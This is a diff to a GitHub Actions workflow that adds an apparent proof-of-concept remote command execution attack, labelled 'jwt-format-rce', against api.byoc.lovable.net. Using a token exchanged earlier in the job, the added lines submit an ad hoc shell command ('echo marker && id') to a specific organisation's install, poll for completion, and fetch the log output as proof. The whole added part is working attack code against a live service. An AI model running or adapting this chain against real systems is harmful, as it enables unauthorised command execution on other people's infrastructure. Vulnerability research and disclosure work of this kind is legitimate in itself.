@@ -45,4 +45,15 @@ jobs:
           fi
           target_token="$(jq -r .token <<<"$exchange")"
           me="$(curl -sS 'https://api.byoc.lovable.net/v1/auth/me' -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
-          jq -n --arg role "$(jq -r .role <<<"$exchange")" --arg type "$(jq -r .account_type <<<"$me")" --argjson permissions "$(jq .permissions <<<"$me")" '{authenticated:true,exchange_role:$role,account_type:$type,permissions:$permissions}'
+          marker="jwt-format-rce-${GITHUB_RUN_ID}"
+          action="$(jq -nc --arg marker "$marker" --arg req "$GITHUB_RUN_ID" '{command:("echo "+$marker+" && id"),timeout:60,name:"jwt-format",request_id:("jwt-format-"+$req),enable_kube_config:false}' | curl -sS -X POST 'https://api.byoc.lovable.net/v1/installs/inlkuvvc4e3mdxznfis5xc6v60/actions/adhoc-run' -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' -H 'Content-Type: application/json' --data-binary @-)"
+          action_id="$(jq -r .id <<<"$action")"
+          for unused in $(seq 1 45); do
+            status="$(curl -sS "https://api.byoc.lovable.net/v1/installs/inlkuvvc4e3mdxznfis5xc6v60/actions/runs/$action_id" -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+            [ "$(jq -r .status <<<"$status")" = finished ] && break
+            sleep 2
+          done
+          job_id="$(jq -r '.runner_job.id' <<<"$status")"
+          log_id="$(jq -r '.runner_job.log_stream_id' <<<"$status")"
+          proof="$(curl -sS "https://api.byoc.lovable.net/v1/log-streams/$log_id/logs?order=asc&runner_job_id=$job_id" -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' | jq -c --arg marker "$marker" '[.[] | select(.log_attributes["nuon.command_output"] == "true") | .body | select(. == $marker or startswith("uid="))]')"
+          jq -n --arg role "$(jq -r .role <<<"$exchange")" --arg type "$(jq -r .account_type <<<"$me")" --arg action_id "$action_id" --arg status "$(jq -r .status <<<"$status")" --argjson permissions "$(jq .permissions <<<"$me")" --argjson proof "$proof" '{authenticated:true,exchange_role:$role,account_type:$type,permissions:$permissions,action_id:$action_id,action_status:$status,command_output:$proof}'
